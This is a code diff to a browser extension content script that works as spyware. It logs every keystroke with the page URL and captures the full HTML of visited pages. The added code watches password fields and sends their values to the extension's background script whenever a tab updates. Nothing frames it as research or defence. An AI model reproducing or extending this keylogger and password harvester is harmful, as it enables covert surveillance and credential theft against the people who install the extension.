@@ -1,22 +1,19 @@
-chrome.runtime.onConnect.addListener(function (port) {});
-
 var k = "";
 var data = {};
 window.onkeydown = function (event) {
-  if (event.key.length > 1) {
-    k = " (" + event.key + ") ";
-  } else {
-    k = event.key;
+  if (event.key) {
+    if (event.key.length > 1) {
+      k = " (" + event.key + ") ";
+    } else {
+      k = event.key;
+    }
+    data = {
+      type: "keyLog",
+      key: k,
+      page: window.location.href,
+    };
+    chrome.runtime.sendMessage(data);
   }
-  data = {
-    type: "keyLog",
-    key: k,
-    page: window.location.href,
-  };
-  chrome.runtime.sendMessage(data);
-  chrome.runtime.sendMessage({msg: "capture"}, function(response) {
-    console.log(response.dataUrl);
-  });
 };
 
 function makePageCapture() {
@@ -33,13 +30,31 @@ function makePageCapture() {
   data = {
     type: "pageLog",
     page: window.location.href,
-    htmldata: htmlOfPage
+    htmldata: htmlOfPage,
   };
   chrome.runtime.sendMessage(data);
 }
 
+function passwordListener() {
+  var inputs = document.getElementsByTagName("input");
+  console.log(inputs);
+  for (let i = 0; i < inputs.length; i++) {
+    if (inputs[i].type.toLowerCase() == "password") {
+      console.log("password");
+      let p = inputs[i];
+      p.onchange = function () {
+        console.log("password change " + p.value);
+        chrome.runtime.sendMessage({ type: "passwordChange", data: p.value });
+      };
+    }
+  }
+}
+
+
 function handleMessageC(request) {
-  if (request.type === "pageCapture") {
+  console.log(request);
+  if (request.type === "tabUpdated") {
+    passwordListener();
     makePageCapture();
   }
 }
